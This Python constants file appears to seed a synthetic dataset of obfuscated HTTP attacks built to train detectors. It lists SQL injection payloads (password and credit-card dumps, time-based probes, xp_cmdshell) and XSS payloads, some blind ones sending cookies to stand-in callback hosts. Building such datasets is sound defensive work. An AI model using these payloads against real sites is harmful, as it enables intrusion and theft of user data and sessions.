"""Constants recovered from the original generate_obfu_dataset.py.

The source script was lost; these values were extracted from its compiled
bytecode so the v1 dataset stays reproducible. Seed catalogues here are the
ones that produced obfu_http_dataset_full.csv (59 unique attack seeds).
"""

SEED = 1337

PLAIN_RATIO = 0.1

SECOND_ORDER_RATIO = 0.08

TIME_RATIO = 0.12

COLUMNS = ['request_id',
 'method',
 'url',
 'host',
 'user_agent',
 'cookie',
 'content_type',
 'content',
 'classification',
 'attack_category',
 'context_location',
 'obfuscation_techniques',
 'obfuscation_type',
 'technique_count',
 'difficulty_level',
 'is_second_order',
 'is_time_based',
 'linked_request_id',
 'source',
 'split']

USER_AGENTS = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/125.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/120.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) '
 'Version/17.4 Safari/605.1.15',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/124.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0',
 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like '
 'Gecko) Version/17.4 Mobile/15E148 Safari/604.1',
 'Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) '
 'Version/17.4 Mobile/15E148 Safari/604.1',
 'Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/125.0.0.0 Mobile Safari/537.36',
 'Mozilla/5.0 (Linux; Android 13; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/124.0.0.0 Mobile Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 '
 'Safari/537.36',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) '
 'Version/16.6 Safari/605.1.15',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/126.0.0.0 Safari/537.36 OPR/112.0.0.0',
 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 '
 'Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/109.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Linux; Android 12; moto g power) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/119.0.0.0 Mobile Safari/537.36',
 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like '
 'Gecko) CriOS/125.0.0.0 Mobile/15E148 Safari/604.1',
 'PostmanRuntime/7.37.3',
 'curl/8.5.0',
 'python-requests/2.31.0',
 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
 'Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)',
 'okhttp/4.12.0',
 'Java/17.0.10',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/122.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/121.0.0.0 Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0',
 'Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/125.0.0.0 Mobile Safari/537.36',
 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
 'Chrome/125.0.0.0 Safari/537.36 Edg/124.0.0.0']

HOSTS = ['shop.northwind-mart.com',
 'www.northwind-mart.com',
 'api.northwind-mart.com',
 'admin.northwind-mart.com',
 'store.acme-retail.io',
 'app.bluewave-shop.net',
 'www.bluewave-shop.net',
 'api.bluewave-shop.net',
 'portal.citymart.vn',
 'shop.citymart.vn',
 'checkout.acme-retail.io',
 'm.northwind-mart.com']

FIRST_NAMES = ['john',
 'mary',
 'david',
 'linh',
 'huy',
 'anna',
 'peter',
 'trang',
 'minh',
 'sara',
 'james',
 'olivia',
 'khang',
 'tuan',
 'emma',
 'daniel',
 'ngoc',
 'liam',
 'noah',
 'mia',
 'an',
 'binh',
 'chi',
 'dung',
 'giang',
 'ha',
 'khanh',
 'lan',
 'nam',
 'phuong',
 'quan',
 'son',
 'thao',
 'vy']

LAST_NAMES = ['smith',
 'nguyen',
 'tran',
 'le',
 'pham',
 'brown',
 'wilson',
 'garcia',
 'vo',
 'do',
 'hoang',
 'bui',
 'dang',
 'ngo',
 'duong',
 'ly',
 'kim',
 'chen',
 'patel',
 'khan']

PRODUCTS = ['wireless-mouse',
 'mechanical-keyboard',
 'usb-c-cable',
 'laptop-stand',
 'webcam-1080p',
 'noise-cancelling-headphones',
 'gaming-monitor',
 'office-chair',
 'desk-lamp',
 'power-bank',
 'smartphone-case',
 'bluetooth-speaker',
 'external-ssd',
 'hdmi-adapter',
 'standing-desk',
 'coffee-mug',
 'water-bottle',
 'backpack',
 'notebook-a5',
 'fountain-pen',
 'running-shoes',
 'yoga-mat',
 'air-purifier',
 'smart-watch',
 'tablet-10inch']

SEARCH_TERMS = ['cheap laptop',
 'best headphones 2026',
 'gaming mouse',
 'office chair ergonomic',
 'usb c hub',
 '4k monitor',
 'wireless earbuds',
 'standing desk white',
 'mechanical keyboard brown switch',
 'iphone case clear',
 'running shoes size 42',
 'yoga mat non slip',
 'coffee grinder',
 'áo thun nam',
 'giày thể thao',
 'bàn phím cơ',
 'tai nghe bluetooth',
 "O'Brien collection",
 'AT&T adapter',
 'C# book']

CATEGORIES = ['electronics', 'accessories', 'home-office', 'sports', 'books', 'fashion', 'toys', 'garden']

CITIES = ['hanoi',
 'ho-chi-minh',
 'danang',
 'new-york',
 'london',
 'tokyo',
 'singapore',
 'berlin',
 'sydney',
 'paris']

METHODS_BENIGN = ['GET', 'POST', 'PUT', 'PATCH', 'DELETE']

BENIGN_WEIGHTS = [0.16, 0.2, 0.18, 0.18, 0.12, 0.06, 0.1]

SQLI_BASE = ["' OR '1'='1",
 "' OR 1=1-- -",
 "admin'-- -",
 "' OR '1'='1'-- -",
 "') OR ('1'='1",
 "1' OR '1'='1",
 "' OR 1=1#",
 '" OR ""="',
 "' UNION SELECT username,password FROM users-- -",
 "' UNION SELECT NULL,NULL,NULL-- -",
 '1 UNION SELECT table_name,column_name FROM information_schema.columns-- -',
 "' UNION SELECT 1,2,3,4,5-- -",
 "' AND extractvalue(1,concat(0x7e,version()))-- -",
 "' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -",
 "' AND (SELECT COUNT(*) FROM users)>0-- -",
 "' AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a'-- -",
 "1' AND 1=CONVERT(int,(SELECT @@version))-- -",
 "'; EXEC xp_cmdshell('whoami')-- -",
 "' OR EXISTS(SELECT * FROM users WHERE username='admin')-- -",
 "-1' UNION SELECT credit_card FROM payments-- -"]

SQLI_TIME = ["' OR SLEEP(5)-- -",
 "' AND SLEEP(5)-- -",
 "1' AND SLEEP(5) AND '1'='1",
 "'; WAITFOR DELAY '0:0:5'-- -",
 "' OR pg_sleep(5)-- -",
 "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)-- -",
 "' RLIKE SLEEP(5)-- -",
 "' OR BENCHMARK(5000000,MD5(1))-- -",
 '1)) OR SLEEP(5)-- -',
 "' AND IF(1=1,SLEEP(5),0)-- -"]

SQLI_STORED = ["admin'-- -",
 "x' UNION SELECT password FROM users-- -",
 "'||(SELECT version())||'",
 "test','a')-- -",
 "' OR 1=1-- -",
 "attacker'/**/UNION/**/SELECT/**/1-- -"]

XSS_SCRIPT = ['<script>alert(1)</script>',
 '<script>alert(document.cookie)</script>',
 "<script>alert('XSS')</script>",
 "<script>fetch('/x?c='+document.cookie)</script>"]

XSS_EVENT = ['<img src=x onerror=alert(1)>',
 '<img src=x onerror=alert(document.cookie)>',
 '<body onload=alert(1)>',
 '<input autofocus onfocus=alert(1)>',
 '<details open ontoggle=alert(1)>',
 '<marquee onstart=alert(1)>',
 '<video><source onerror=alert(1)>',
 '<body onpageshow=alert(1)>']

XSS_SVG = ['<svg onload=alert(1)>',
 '<svg/onload=alert(1)>',
 '<svg><script>alert(1)</script></svg>',
 '<svg onload=alert(document.cookie)>']

XSS_OTHER = ['<iframe src=javascript:alert(1)>',
 '<a href="javascript:alert(1)">x</a>',
 'javascript:alert(1)',
 '<object data=javascript:alert(1)>']

XSS_BLIND = ['<script src=//oob-{id}.collab-listener.net/x></script>',
 "<img src=x onerror=this.src='//oob-{id}.collab-listener.net/c='+document.cookie>",
 '"><script src=//{id}.oob-callback.net></script>',
 "<script>new Image().src='//oob-{id}.collab-listener.net/?d='+document.cookie</script>"]

XSS_STORED = ['<script>alert(1)</script>',
 '<img src=x onerror=alert(document.cookie)>',
 '<svg/onload=alert(1)>',
 '"><script>alert(document.domain)</script>']

SQL_KEYWORDS = ['UNION',
 'SELECT',
 'FROM',
 'WHERE',
 'AND',
 'OR',
 'ORDER',
 'BY',
 'INSERT',
 'UPDATE',
 'DELETE',
 'DROP',
 'EXEC',
 'CONVERT',
 'SUBSTRING',
 'SLEEP',
 'WAITFOR',
 'BENCHMARK',
 'information_schema',
 'columns',
 'tables',
 'users',
 'password',
 'username',
 'extractvalue',
 'updatexml',
 'concat',
 'database',
 'version',
 'credit_card',
 'payments',
 'count',
 'exists',
 'if',
 'rlike']

WS_TOKENS = ['%09', '%0a', '%0c', '%0d', '%20', '+', '%a0', '\t']

SQLI_TECHNIQUES = ['url_encoding',
 'hex_encoding',
 'comment_injection',
 'case_variation',
 'whitespace_variation',
 'char_encoding']

SQLI_PIPELINE = ['char_encoding',
 'hex_encoding',
 'comment_injection',
 'case_variation',
 'whitespace_variation',
 'url_encoding']

SQLI_MUTEX = [{'hex_encoding', 'char_encoding'}]

XSS_PIPELINE = ['svg_bypass',
 'event_handler',
 'case_variation',
 'html_entity',
 'js_encoding',
 'unicode_escape',
 'double_encoding']

URL_SAFE_SKIP = ['-',
 '.',
 '0',
 '1',
 '2',
 '3',
 '4',
 '5',
 '6',
 '7',
 '8',
 '9',
 'A',
 'B',
 'C',
 'D',
 'E',
 'F',
 'G',
 'H',
 'I',
 'J',
 'K',
 'L',
 'M',
 'N',
 'O',
 'P',
 'Q',
 'R',
 'S',
 'T',
 'U',
 'V',
 'W',
 'X',
 'Y',
 'Z',
 '_',
 'a',
 'b',
 'c',
 'd',
 'e',
 'f',
 'g',
 'h',
 'i',
 'j',
 'k',
 'l',
 'm',
 'n',
 'o',
 'p',
 'q',
 'r',
 's',
 't',
 'u',
 'v',
 'w',
 'x',
 'y',
 'z',
 '~']
